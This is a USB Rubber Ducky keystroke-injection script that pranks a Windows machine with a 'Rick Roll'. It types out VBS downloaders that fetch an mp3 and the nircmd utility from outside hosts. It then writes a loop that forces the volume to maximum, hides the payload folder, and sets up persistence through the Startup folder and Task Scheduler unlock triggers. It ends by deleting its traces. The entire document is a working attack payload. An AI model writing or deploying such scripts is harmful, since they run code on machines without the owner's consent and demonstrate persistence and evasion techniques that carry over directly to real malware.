REM Rick Roll by Emerald
REM https://github.com/Emerald-cmd/DuckyRoll.git
DELAY 8000
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 200
REM create folder to hold payloads
STRING mkdir "%USERPROFILE%\Music\tmp"
ENTER
REM write download script
STRING cd %tmp% && copy con dlrick.vbs
ENTER
REM get user home directory
ENTER
STRING Dim oShell: Set oShell = CreateObject("WScript.Shell")
ENTER
STRING Dim PRFL: PRFL = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
ENTER
REM initialize HTTP objects
ENTER
STRING Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
ENTER
STRING Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
ENTER
REM open mp3 stream
STRING xHttp.Open "GET", "https://qoret.com/dl/uploads/2019/07/Rick_Astley_-_Never_Gonna_Give_You_Up_Qoret.com.mp3", False
ENTER
STRING xHttp.Send
ENTER
REM download and write to file
STRING With bStrm
ENTER
STRING .type = 1
ENTER
STRING .open
ENTER
STRING .write xHttp.responseBody
ENTER
STRING .saveToFile PRFL + "\Music\tmp\rick.mp3", 2
ENTER
STRING End With
ENTER
DELAY 100
CTRL Z
ENTER
STRING copy con dlnir.vbs
ENTER
REM get user home directory
ENTER
STRING Dim oShell: Set oShell = CreateObject("WScript.Shell")
ENTER
STRING Dim PRFL: PRFL = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
ENTER
REM initialize HTTP objects
ENTER
STRING Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
ENTER
STRING Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
ENTER
REM open mp3 stream
STRING xHttp.Open "GET", "http://www.nirsoft.net/utils/nircmd-x64.zip", False
ENTER
STRING xHttp.Send
ENTER
REM download and write to file
STRING With bStrm
ENTER
STRING .type = 1
ENTER
STRING .open
ENTER
STRING .write xHttp.responseBody
ENTER
STRING .saveToFile PRFL + "\Music\tmp\nircmd-x64.zip", 2
ENTER
STRING End With
ENTER
DELAY 100
CTRL Z
ENTER
REM download mp3 and nircmd
STRING wscript dlnir.vbs && wscript dlrick.vbs
ENTER
DELAY 7000
REM extract nircmd
STRING powershell.exe -nologo -noprofile -command "& { Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\Music\tmp\nircmd-x64.zip', '%USERPROFILE%\Music\tmp'); }"
ENTER
DELAY 750
REM write volume up payload
STRING copy con volup.bat
ENTER
STRING :loop
ENTER
STRING %USERPROFILE%\Music\tmp\nircmd.exe mutesysvolume 0
ENTER
STRING %USERPROFILE%\Music\tmp\nircmd.exe setsysvolume 65535
ENTER
STRING timeout /t 5
ENTER
STRING goto loop
ENTER
DELAY 100
CTRL z
ENTER
STRING move volup.bat %USERPROFILE%\Music\tmp\volup.bat
ENTER
REM hide payload folder
STRING copy con hidefiles.vbs
ENTER
STRING Dim oShell: Set oShell = CreateObject("WScript.Shell")
ENTER
STRING Dim PRFL: PRFL = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
ENTER
STRING Dim oFSo: Set oFSo = CreateObject("Scripting.FileSystemObject")
ENTER
STRING Dim tmpDir: Set tmpDir = oFSo.GetFolder(PRFL + "\Music\tmp")
ENTER
STRING tmpDir.attributes = tmpDir.attributes + 2
ENTER
DELAY 100
CTRL z
ENTER
STRING wscript hidefiles.vbs
ENTER
REM write WMP payload
STRING copy con rickyou.vbs
ENTER
REM get user profile directory
STRING Dim oShell: Set oShell = CreateObject("WScript.Shell")
ENTER
STRING Dim PRFL: PRFL = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
ENTER
REM start playing on loop
STRING While true
ENTER
STRING Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX")
ENTER
STRING oPlayer.URL = PRFL + "\Music\tmp\rick.mp3"
ENTER
STRING oPlayer.controls.play
ENTER
STRING While oPlayer.playState <> 1 ' 1 = Stopped
ENTER
STRING WScript.Sleep 100
ENTER
STRING Wend
ENTER
STRING oPlayer.close
ENTER
STRING Wend
ENTER
DELAY 100
CTRL z
ENTER
REM write vbs payload to hide cmd window for volup.bat
STRING copy con volup.vbs
ENTER
STRING CreateObject("WScript.Shell").Run "%USERPROFILE%\Music\tmp\volup.bat", 0, False
ENTER
DELAY 100
CTRL z
ENTER
REM move payloads to startup directory
STRING copy rickyou.vbs "%USERPROFILE%\Music\tmp\rickyou.vbs"
ENTER
STRING move rickyou.vbs "%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickyou.vbs"
ENTER
STRING copy volup.vbs "%USERPROFILE%\Music\tmp\volup.vbs"
ENTER
STRING move volup.vbs "%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\volup.vbs"
ENTER
REM cleanup
STRING del dlrick.vbs
ENTER
STRING del dlnir.vbs
ENTER
STRING del hidefiles.vbs
ENTER
STRING del %USERPROFILE%\Music\tmp\NirCmd.chm
ENTER
STRING del %USERPROFILE%\Music\tmp\nircmdc.exe
ENTER
STRING del %USERPROFILE%\Music\tmp\nircmd-x64.zip
ENTER
STRING exit
ENTER
REM add to task scheduler to run after unlocking workstation
DELAY 250
GUI r
DELAY 250
STRING taskschd.msc
ENTER
DELAY 2000
ALT a
STRING b
DELAY 1000
STRING rr
ENTER
UP
ENTER
STRING s
TAB
TAB
STRING 4801
ENTER
ENTER
STRING wscript
TAB
TAB
STRING %USERPROFILE%\Music\tmp\rickyou.vbs
ENTER
ENTER
DELAY 500
ALT a
STRING b
DELAY 1000
STRING vu
ENTER
UP
ENTER
STRING s
TAB
TAB
STRING 4801
ENTER
ENTER
STRING wscript
TAB
TAB
STRING %USERPROFILE%\Music\tmp\volup.vbs
ENTER
ENTER
DELAY 500
ALT f
STRING x
